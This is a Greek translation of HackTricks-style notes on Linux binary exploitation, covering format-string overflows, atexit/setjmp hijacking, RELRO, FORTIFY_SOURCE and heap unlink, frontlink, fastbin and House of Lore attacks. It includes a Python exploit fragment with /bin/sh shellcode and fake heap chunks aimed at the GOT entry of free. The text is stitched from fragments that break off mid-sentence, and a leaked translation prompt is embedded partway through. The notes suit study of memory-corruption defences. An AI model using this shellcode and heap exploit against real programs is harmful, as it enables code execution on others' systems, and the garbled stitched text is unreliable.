Η συνάρτηση **sprintf** μεταφέρει μια μορφοποιημένη συμβολοσειρά σε μια μεταβλητή. Επομένως, μπορείτε να καταχραστείτε τη μορφοποίηση μιας συμβολοσειράς για να προκαλέσετε μια πλημμύρα buffer στη μεταβλητή όπου αντιγράφεται το περιεχόμενο.\
Για παράδειγμα, το φορτίο `%.44xAAAA` θα **γράψει 44B+"AAAA" στη μεταβλητή**, πράγμα που μπορεί να προκαλέσει μια πλημμύρα buffer.

### **Δομές \_\_atexit**

{% hint style="danger" %}
Σήμερα είναι πολύ **παράξενο να εκμεταλλεύεστε αυτό**.
{% endhint %}

Η συνάρτηση **`atexit()`** είναι μια συνάρτηση στην οποία περνιούνται **άλλες συναρτήσεις ως παράμετροι**. Αυτές οι **συναρτήσεις** θα **εκτελεστούν** όταν εκτελείται μια συνάρτηση **`exit()`** ή η **επιστροφή** από τη **main**.\
Αν μπορείτε να **τροποποιήσετε** τη **διεύθυνση** οποιασδήποτε από αυτές τις **συναρτήσεις** για να δείχνει σε ένα shellcode, για παράδειγμα, τότε θα **καταλάβετε τον έλεγχο** της **διεργασίας**, αλλά αυτό είναι πιο περίπλοκο αυτή τη στιγμή.\
Αυτή τη στιγμή οι **διευθύνσεις των συναρτήσεων** που θα εκτελεστούν είναι **κρυμμένες** πίσω από αρκετές δομές και τελικά η διεύθυνση στην οποία δείχνει δεν είναι η διεύθυνση των συναρτήσεων, αλλά είναι **κρυπτογραφημένες με XOR** και μετατοπίσεις με ένα **τυχαίο κλειδί**. Έτσι, αυτός ο διάνυσμα επίθεσης δεν είναι πολύ χρήσιμος τουλάχιστον στο x86 και x64\_86.\
Η συνάρτηση κρυπτογράφησης είναι **`PTR_MANGLE`**. **Άλλες αρχιτεκτονικές** όπως m68k, mips32, mips64, aarch64, arm, hppa... **δεν υλοποιούν την κρυπτογράφηση** επειδή **επιστρέφουν το ίδιο** με αυτό που λαμβάνουν ως είσοδο. Έτσι, αυτές οι αρχιτεκτονικές θα μπορούσαν να είναι ευάλωτες από αυτό το διάνυσμα επίθεσης.

### **setjmp() & longjmp()**

{% hint style="danger" %}
Σήμερα είναι πολύ **παράξενο να εκμεταλλεύεστε αυτό**.
{% endhint %}

Η συνάρτηση **`setjmp()`** επιτρέπει να **αποθηκεύσετε** το **περιβάλλον** (τους καταχωρητές)\
Η συνάρτηση **`longjmp()`** επιτρέπει να **επαναφέρετε** το **περιβάλλον**.\
Οι **αποθηκευμένοι καταχωρητές** είναι: `EBX, ESI, EDI, ESP, EIP, EBP`\
Αυτό που συμβαίνει είναι ότι το EIP και το ESP περνιούνται από τη συνάρτηση **`PTR_MANGLE`**, οπότε οι αρχιτεκτονικές που είναι ευάλωτες σε αυτήν την επίθεση είναι οι ίδιες με παραπάνω.\
Είναι χρήσιμες για ανάκτηση σφαλμάτων ή διακοπών.\
Ωστόσο, από ό,τι έχω διαβάσει, οι άλλοι καταχωρητές δεν προστατεύονται, **έτσι αν υπάρχει ένα `call ebx`, `call esi` ή `call edi`** μέσα
### Relro

**Relro (Read only Relocation)** επηρεάζει τις άδειες μνήμης παρόμοια με το NX. Η διαφορά είναι ότι ενώ με το NX καθιστά τη στοίβα εκτελέσιμη, το RELRO καθιστά **ορισμένα πράγματα μόνο για ανάγνωση**, οπότε **δεν μπορούμε να τα γράψουμε**. Ο πιο συνηθισμένος τρόπος που έχω δει αυτό να αποτελεί εμπόδιο είναι να μας εμποδίζει να κάνουμε μια **αντικατάσταση πίνακα `got`**, η οποία θα καλυφθεί αργότερα. Ο πίνακας `got` περιέχει διευθύνσεις για συναρτήσεις της libc, έτσι ώστε το δυαδικό να γνωρίζει ποιες είναι οι διευθύνσεις και να τις καλεί. Ας δούμε πώς φαίνονται οι άδειες μνήμης για μια εγγραφή πίνακα `got` για ένα δυαδικό με και χωρίς relro.

Με relro:
```bash
gef➤  vmmap
Start              End                Offset             Perm Path
0x0000555555554000 0x0000555555555000 0x0000000000000000 r-- /tmp/tryc
0x0000555555555000 0x0000555555556000 0x0000000000001000 r-x /tmp/tryc
0x0000555555556000 0x0000555555557000 0x0000000000002000 r-- /tmp/tryc
0x0000555555557000 0x0000555555558000 0x0000000000002000 r-- /tmp/tryc
0x0000555555558000 0x0000555555559000 0x0000000000003000 rw- /tmp/tryc
0x0000555555559000 0x000055555557a000 0x0000000000000000 rw- [heap]
0x00007ffff7dcb000 0x00007ffff7df0000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7df0000 0x00007ffff7f63000 0x0000000000025000 r-x /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7f63000 0x00007ffff7fac000 0x0000000000198000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fac000 0x00007ffff7faf000 0x00000000001e0000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7faf000 0x00007ffff7fb2000 0x00000000001e3000 rw- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fb2000 0x00007ffff7fb8000 0x0000000000000000 rw-
0x00007ffff7fce000 0x00007ffff7fd1000 0x0000000000000000 r-- [vvar]
0x00007ffff7fd1000 0x00007ffff7fd2000 0x0000000000000000 r-x [vdso]
0x00007ffff7fd2000 0x00007ffff7fd3000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7fd3000 0x00007ffff7ff4000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ff4000 0x00007ffff7ffc000 0x0000000000022000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000029000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x000000000002a000 rw- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw-
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
gef➤  p fgets
$2 = {char *(char *, int, FILE *)} 0x7ffff7e4d100 <_IO_fgets>
gef➤  search-pattern 0x7ffff7e4d100
[+] Searching '\x00\xd1\xe4\xf7\xff\x7f' in memory
[+] In '/tmp/tryc'(0x555555557000-0x555555558000), permission=r--
0x555555557fd0 - 0x555555557fe8  →   "\x00\xd1\xe4\xf7\xff\x7f[...]"
```
Χωρίς το relro:
```bash
gef➤  vmmap
Start              End                Offset             Perm Path
0x0000000000400000 0x0000000000401000 0x0000000000000000 r-- /tmp/try
0x0000000000401000 0x0000000000402000 0x0000000000001000 r-x /tmp/try
0x0000000000402000 0x0000000000403000 0x0000000000002000 r-- /tmp/try
0x0000000000403000 0x0000000000404000 0x0000000000002000 r-- /tmp/try
0x0000000000404000 0x0000000000405000 0x0000000000003000 rw- /tmp/try
0x0000000000405000 0x0000000000426000 0x0000000000000000 rw- [heap]
0x00007ffff7dcb000 0x00007ffff7df0000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7df0000 0x00007ffff7f63000 0x0000000000025000 r-x /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7f63000 0x00007ffff7fac000 0x0000000000198000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fac000 0x00007ffff7faf000 0x00000000001e0000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7faf000 0x00007ffff7fb2000 0x00000000001e3000 rw- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fb2000 0x00007ffff7fb8000 0x0000000000000000 rw-
0x00007ffff7fce000 0x00007ffff7fd1000 0x0000000000000000 r-- [vvar]
0x00007ffff7fd1000 0x00007ffff7fd2000 0x0000000000000000 r-x [vdso]
0x00007ffff7fd2000 0x00007ffff7fd3000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7fd3000 0x00007ffff7ff4000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ff4000 0x00007ffff7ffc000 0x0000000000022000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000029000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x000000000002a000 rw- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw-
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
gef➤  p fgets
$2 = {char *(char *, int, FILE *)} 0x7ffff7e4d100 <_IO_fgets>
gef➤  search-pattern 0x7ffff7e4d100
[+] Searching '\x00\xd1\xe4\xf7\xff\x7f' in memory
[+] In '/tmp/try'(0x404000-0x405000), permission=rw-
0x404018 - 0x404030  →   "\x00\xd1\xe4\xf7\xff\x7f[...]"
```
Για το δυαδικό **χωρίς relro**, μπορούμε να δούμε ότι η διεύθυνση `got` εισόδου για τη συνάρτηση `fgets` είναι `0x404018`. Κοιτώντας τις αντιστοιχίες μνήμης βλέπουμε ότι ανήκει μεταξύ `0x404000` και `0x405000`, τα οποία έχουν τις **άδειες `rw`**, που σημαίνει ότι μπορούμε να τη διαβάσουμε και να γράψουμε. Για το δυαδικό **με relro**, βλέπουμε ότι η διεύθυνση του πίνακα `got` για την εκτέλεση του δυαδικού (εφόσον έχει ενεργοποιηθεί το pie, αυτή η διεύθυνση θα αλλάξει) είναι `0x555555557fd0`. Στην αντιστοίχιση μνήμης του δυαδικού αυτού, ανήκει μεταξύ `0x0000555555557000` και `0x0000555555558000`, τα οποία έχουν τη μνήμη **άδεια `r`**, που σημαίνει ότι μπορούμε μόνο να τη διαβάσουμε.

Ποια είναι η **παράκαμψη**; Η τυπική παράκαμψη που χρησιμοποιώ είναι απλά να μην γράφω σε περιοχές μνήμης που η relro προκαλεί να γίνουν μόνο για ανάγνωση, και να **βρω έναν διαφορετικό τρόπο για να εκτελέσω κώδικα**.

Σημειώστε ότι για να συμβεί αυτό, το δυαδικό πρέπει να γνωρίζει πριν από την εκτέλεση τις διευθύνσεις των συναρτήσεων:

* Αργή δέσμευση: Η διεύθυνση μιας συνάρτησης αναζητείται την πρώτη φορά που καλείται η συνάρτηση. Έτσι, ο πίνακας GOT πρέπει να έχει δικαιώματα εγγραφής κατά τη διάρκεια της εκτέλεσης.
* Δέσμευση τώρα: Οι διευθύνσεις των συναρτήσεων επιλύονται στην αρχή της εκτέλεσης, και στη συνέχεια δίνονται δικαιώματα μόνο για ανάγνωση σε ευαίσθητες ενότητες όπως οι .got, .dtors, .ctors, .dynamic, .jcr. `` `** ``-z relro`**`y`**`-z now\`\*\*

Για να ελέγξετε αν ένα πρόγραμμα χρησιμοποιεί Δέσμευση τώρα, μπορείτε να κάνετε:
```bash
readelf -l /proc/ID_PROC/exe | grep BIND_NOW
```
Όταν το δυαδικό φορτώνεται στη μνήμη και μια συνάρτηση καλείται για πρώτη φορά, γίνεται ένα άλμα (jmp) στο PLT (Procedure Linkage Table), από εκεί γίνεται ένα άλμα στο GOT και ανακαλύπτει ότι αυτή η καταχώρηση δεν έχει επιλυθεί (περιέχει μια επόμενη διεύθυνση του PLT). Έτσι, καλεί το Runtime Linker ή rtfd για να επιλύσει τη διεύθυνση και να την αποθηκεύσει στο GOT.

Όταν καλείται μια συνάρτηση, καλείται το PLT, το οποίο έχει τη διεύθυνση του GOT όπου αποθηκεύεται η διεύθυνση της συνάρτησης, οπότε ανακατευθύνει τη ροή εκεί και έτσι καλείται η συνάρτηση. Ωστόσο, αν είναι η πρώτη φορά που καλείται η συνάρτηση, αυτό που υπάρχει στο GOT είναι η επόμενη εντολή του PLT, επομένως η ροή ακολουθεί τον κώδικα του PLT (rtfd) και ανακαλύπτει τη διεύθυνση της συνάρτησης, την αποθηκεύει στο GOT και την καλεί.

Κατά τη φόρτωση ενός δυαδικού στη μνήμη, ο μεταγλωττιστής του έχει πει σε ποια μετατόπιση πρέπει να τοποθετήσει δεδομένα που πρέπει να φορτωθούν κατά την εκτέλεση του προγράμματος.

Lazy binding -> Η διεύθυνση της συνάρτησης αναζητείται την πρώτη φορά που καλείται αυτή η συνάρτηση, έτσι το GOT έχει δικαιώματα εγγραφής ώστε όταν αναζητηθεί, να αποθηκευτεί εκεί και να μην χρειαστεί να αναζητηθεί ξανά.

Bind now -> Οι διευθύνσεις των συναρτήσεων αναζητούνται κατά τη φόρτωση του προγράμματος και αλλάζονται οι άδειες των ενοτήτων .got, .dtors, .ctors, .dynamic, .jcr σε μόνο ανάγνωση. -z relro και -z now

Παρόλα αυτά, γενικά τα προγράμματα δεν είναι περίπλοκα με αυτές τις επιλογές, οπότε αυτές οι επιθέσεις παραμένουν εφικτές.

readelf -l /proc/ID_PROC/exe | grep BIND_NOW -> Για να δούμε αν χρησιμοποιούν το BIND NOW

Fortify Source -D_FORTIFY_SOURCE=1 ή =2

Προσπαθεί να ανιχνεύσει τις συναρτήσεις που αντιγράφουν από ένα μέρος σε ένα άλλο με ανασφαλή τρόπο και να αντικαταστήσει τη συνάρτηση με μια ασφαλή συνάρτηση.

Για παράδειγμα:\
char buf[16];\
strcpy(but, source);

Το αναγνωρίζει ως μη ασφαλές και τότε αντικαθιστά την strcpy() με την __strcpy_chk() χρησιμοποιώντας το μέγιστο μέγεθος που μπορεί να αντιγραφεί ως μέγιστο μέγεθος του buffer.

Η διαφορά μεταξύ =1 ή =2 είναι ότι:

Το δεύτερο δεν επιτρέπει το %n να προέρχεται από μια ενότητα με δικαιώματα εγγραφής. Επιπλέον, η παράμετρος για άμεση πρόσβαση σε ορίσματα μπορεί να χρησιμοποιηθεί μόνο αν χρησιμοποιηθούν οι προηγούμενες, δηλαδή μπορεί να χρησιμοποιηθεί μόνο το %3$d αν προηγουμένως έχει χρησιμοποιηθεί το %2$d και το %1$d

Για να εμφανιστεί το μήνυμα σφάλματος χρησιμοποιείται το argv[0], οπότε αν οριστεί
**shellcode += "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" \\**

**"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" \\**

**"\x80\xe8\xdc\xff\xff\xff/bin/sh";**

**prev\_size = pack("\<I”, 0xfffffff0) #Είναι σημαντικό το bit που υποδηλώνει ότι το προηγούμενο κομμάτι είναι ελεύθερο να είναι 1**

**fake\_size = pack("\<I”, 0xfffffffc) #-4, για να πιστέψει ότι το "size" του 3ου κομματιού είναι 4bytes πίσω (δείχνει στο prev\_size) εκεί όπου ελέγχει αν το 2ο κομμάτι είναι ελεύθερο**

**addr\_sc = pack("\<I", 0x0804a008 + 8) #Στο payload στην αρχή θα βάλουμε 8bytes fill**

**got\_free = pack("\<I", 0x08048300 - 12) #Διεύθυνση της free() στο plt-12 (θα είναι η διεύθυνση που θα αντικατασταθεί για να εκτελεστεί το shellcode τη 2η φορά που καλείται η free)**

**payload = "aaaabbbb" + shellcode + "b"\*(512-len(shellcode)-8) #Όπως αναφέρθηκε, το payload ξεκινά με 8 bytes fill γιατί**

**payload += prev\_size + fake\_size + got\_free + addr\_sc #Τροποποιείται το 2ο κομμάτι, το got\_free δείχνει όπου θα αποθηκευτεί η διεύθυνση addr\_sc + 12**

**os.system("./8.3.o " + payload)**

**unset() απελευθερώνοντας ανάποδα (wargame)**

Έχουμε έλεγχο επί 3 συνεχόμενων chunks και απελευθερώνονται με αντίστροφη σειρά από την κράτηση.

Σε αυτήν την περίπτωση:

Στο chunk c τοποθετούμε το shellcode.

Χρησιμοποιούμε το chunk a για να αντικαταστήσουμε το b έτσι ώστε το size να έχει το bit PREV\_INUSE απενεργοποιημένο, ώστε να πιστεύει ότι το chunk a είναι ελεύθερο.

Επιπλέον, αντικαθιστούμε το μέγεθος της κεφαλίδας b ώστε να είναι -4.

Έτσι, το πρόγραμμα θα πιστεύει ότι το "a" είναι ελεύθερο και σε ένα bin, οπότε θα καλέσει την unlink() για να το αποσυνδέσει. Ωστόσο, επειδή η κεφαλίδα PREV\_SIZE είναι -4, θα πιστεύει ότι το κομμάτι "a" πραγματικά ξεκινά από το b+4. Δηλαδή, θα κάνει unlink() σε ένα κομμάτι που ξεκινά από το b+4, οπότε στο b+12 θα είναι ο δείκτης "fd" και στο b+16 θα είναι ο δείκτης "bk".

Με αυτόν τον τρόπο, αν βάλουμε τη διεύθυνση του shellcode στο bk και τη διεύθυνση της συνάρτησης "puts()"-12 στο fd, έχουμε το payload μας.

**Τεχνική Frontlink**

Το frontlink καλείται όταν κάτι απελευθερώνεται και κανένα από τα γειτονικά του κομμάτια δεν είναι ελεύθερο, δεν καλείται unlink() αλλά καλείται απευθείας το frontlink().

Χρήσιμη ευπάθεια όταν το malloc που επιτίθεται δεν απελευθερώνεται ποτέ (free()).

Απαιτεί:

Ένα buffer που μπορεί να υπερχειλιστεί με τη συνάρτηση εισόδου δεδομένων.

Ένα buffer που είναι γειτονικό και πρέπει να απελευθερωθεί και στο οποίο θα τροποποιηθεί το πεδίο fd της κεφαλίδας του χάρη στην υπερχείλιση του προηγούμενου buffer.

Ένα buffer που πρέπει να απελευθερωθεί με μέγεθος μεγαλύτερο από 512 αλλά μικρότερο από το προηγούμενο buffer.

Ένα buffer που δηλώνεται πριν από το βήμα 3 και επιτρέπει την αντικατάσταση του prev\_size του.

Με αυτόν τον τρόπο, αν μπορού
Αυτή η τεχνική δεν είναι πλέον εφαρμόσιμη, καθώς εφαρμόστηκε σχεδόν η ίδια επιδιόρθωση με αυτή του unlink. Συγκρίνονται αν η νέα τοποθεσία προς την οποία δείχνει επίσης δείχνει προς αυτήν.

**Fastbin**

Είναι μια παραλλαγή του The house of mind.

Μας ενδιαφέρει να εκτελέσουμε τον ακόλουθο κώδικα, ο οποίος εκτελείται μετά τον έλεγχο της συνάρτησης \_int\_free():

fb = &(av->fastbins\[fastbin\_index(size)] —> Όπου fastbin\_index(sz) —> (sz >> 3) - 2

…

p->fd = \*fb

\*fb = p

Με αυτόν τον τρόπο, αν τοποθετηθεί στο "fb" η διεύθυνση μιας συνάρτησης στην GOT, σε αυτήν τη διεύθυνση θα τοποθετηθεί η διεύθυνση του κομματιού που έχει αντικατασταθεί. Για να γίνει αυτό, είναι απαραίτητο να είναι η αρένα κοντά στις διευθύνσεις των dtors. Πιο συγκεκριμένα, το av->max\_fast πρέπει να είναι στη διεύθυνση που θα αντικατασταθεί.

Δεδομένου ότι με το The House of Mind είδαμε ότι ελέγχουμε τη θέση του av.

Έτσι, αν στο πεδίο size βάλουμε μέγεθος 8 + NON\_MAIN\_ARENA + PREV\_INUSE —> η fastbin\_index() θα μας επιστρέψει fastbins\[-1], που θα δείχνει στο av->max\_fast.

Σε αυτήν την περίπτωση, το av->max\_fast θα είναι η διεύθυνση που θα αντικατασταθεί (όχι στην οποία δείχνει, αλλά αυτή η θέση θα αντικατασταθεί).

Επιπλέον, πρέπει να ισχύει ότι το κομμάτι που ακολουθεί το απελευθερωμένο πρέπει να είναι μεγαλύτερο από 8 -> Δεδομένου ότι είπαμε ότι το μέγεθος του απελευθερωμένου κομματιού είναι 8, σε αυτό το ψεύτικο κομμάτι πρέπει απλά να βάλουμε ένα μέγεθος μεγαλύτερο από 8 (καθώς η shellcode θα βρίσκεται στο απελευθερωμένο κομμάτι, πρέπει να βάλουμε ένα jmp που θα πέσει σε nops).

Επιπλέον, αυτό το ψεύτικο κομμάτι πρέπει να είναι μικρότερο από το av->system\_mem. Το av->system\_mem βρίσκεται 1848 bytes πιο πάνω.

Λόγω των μηδενικών του \_DTOR\_END\_ και των λίγων διευθύνσεων στην GOT, καμία από αυτές τις ενότητες δεν είναι κατάλληλη για αντικατάσταση, οπότε ας δούμε πώς να εφαρμόσουμε το fastbin για να επιτεθούμε στη στοίβα.

Ένας άλλος τρόπος επίθεσης είναι να ανακατευθύνουμε το **av** προς τη στοίβα.

Αν τροποποιήσουμε το μέγεθος ώστε να είναι 16 αντί για 8, τότε: η fastbin\_index() θα μας επιστρέψει fastbins\[0] και μπορούμε να το χρησιμοποιήσουμε για να αντικαταστήσουμε τη στοίβα.

Για αυτό, δεν πρέπει να υπάρχει κανένα canary ή περίεργες τιμές στη στοίβα, για την ακρίβεια πρέπει να βρισκόμαστε σε αυτήν: 4bytes μηδενικά + EBP + RET

Τα 4 μηδενικά bytes απαιτούνται γιατί το **av** θα είναι σε αυτήν τη διεύθυνση και το πρώτο στοιχείο ενός **av** είναι το mutexe που πρέπει να είναι 0.

Το **av->max\_fast** θα είναι το EBP και θα είναι μια τιμή που θα μας βοηθήσει να παρακάμψουμε τους περιορισμο
Ακολουθεί περιεχόμενο από ένα βιβλίο για χάκινγκ σχετικά με τεχνικές χάκινγκ. Το παρακάτω περιεχόμενο είναι από το αρχείο /hive/hacktricks/exploiting/linux-exploiting-basic-esp/README.md. Μεταφράστε το σχετικό αγγλικό κείμενο στα ελληνικά και επιστρέψτε τη μετάφραση διατηρώντας ακριβώς την ίδια σύνταξη markdown και html. Μην μεταφράζετε πράγματα όπως κώδικας, ονόματα τεχνικών χάκινγκ, όρους χάκινγκ, ονόματα πλατφορμών cloud/SaaS (όπως Workspace, aws, gcp...), ο όρος 'διαρροή', pentesting και ετικέτες markdown. Επίσης, μην προσθέτετε κανένα επιπλέον περιεχόμενο εκτός από τη μετάφραση και τη σύνταξη markdown.

```markdown
Αποθηκεύονται δύο malloc, έτσι ώστε το πρώτο να μπορεί να υποστεί overflow μετά την απελευθέρωση και την εισαγωγή του δεύτερου στον bin του (δηλαδή, να έχει καταχωρηθεί ένα malloc μεγαλύτερο από το δεύτερο κομμάτι πριν από το overflow).

Το malloc που καταχωρείται με τη διεύθυνση που επιλέγει ο επιτιθέμενος ελέγχεται από τον επιτιθέμενο.

Ο στόχος είναι ο εξής, αν μπορούμε να προκαλέσουμε ένα overflow σε ένα heap που έχει ένα απελευθερωμένο κομμάτι και βρίσκεται στον bin του, μπορούμε να αλλάξουμε τον δείκτη bk. Αν αλλάξουμε τον δείκτη bk και αυτό το κομμάτι γίνει το πρώτο στη λίστα του bin και καταχωρηθεί, θα εξαπατηθεί ο bin και θα του λεχθεί ότι το τελευταίο κομμάτι της λίστας (το επόμενο που προσφέρεται) βρίσκεται στην παραπλανητική διεύθυνση που έχουμε ορίσει (π.χ. στο stack ή στο GOT). Έτσι, αν καταχωρηθεί ξανά ένα κομμάτι και ο επιτιθέμενος έχει δικαιώματα σε αυτό, θα λάβει ένα κομμάτι στην επιθυμητή θέση και θα μπορεί να γράψει σε αυτήν.

Μετά την απελευθέρωση του τροποποιημένου κομματιού, είναι απαραίτητο να καταχωρηθεί ένα μεγαλύτερο κομμάτι από αυτό που απελευθερώθηκε, έτσι το τροποποιημένο κομμάτι θα βγει από τους unsorted bins και θα εισαχθεί στον bin του.

Μόλις βρεθεί στον bin του, είναι η στιγμή να τροποποιηθεί ο δείκτης bk μέσω του overflow ώστε να δείχνει στη διεύθυνση που θέλουμε να αντικαταστήσουμε.

Έτσι, ο bin πρέπει να περιμένει να κληθεί η malloc() αρκετές φορές ώστε να χρησιμοποιηθεί ξανά ο τροποποιημένος bin και να εξαπατηθεί ο bin που πιστεύει ότι το επόμενο κομμάτι βρίσκεται στην παραπλανητική διεύθυνση. Και στη συνέχεια θα δοθεί το επιθυμητό κομμάτι.

Για να εκτελεστεί η ευπάθεια το συντομότερο δυνατόν, ιδανικά θα ήταν: Καταχώρηση του ευπαθούς κομματιού, καταχώρηση του κομματιού που θα τροποποιηθεί, απελευθέρωση αυτού του κομματιού, καταχώρηση ενός μεγαλύτερου κομματιού από αυτό που θα τροποποιηθεί, τροποποίηση του κομματιού (ευπάθεια), καταχώρηση ενός κομματιού ίδιου μεγέθους με το ευπαθές και καταχώρηση ενός δεύτερου κομματιού ίδιου μεγέθους και αυτό θα δείχνει στην επιλεγμένη διεύθυνση.

Για να προστατευθεί αυτή η επίθεση, χρησιμοποιείται ο συνηθισμένος έλεγχος ότι το κομμάτι "δεν" είναι ψεύτικο: ελέγχεται αν το bck->fd δείχνει στον victim. Δηλαδή, στην περίπτωσή μας, αν
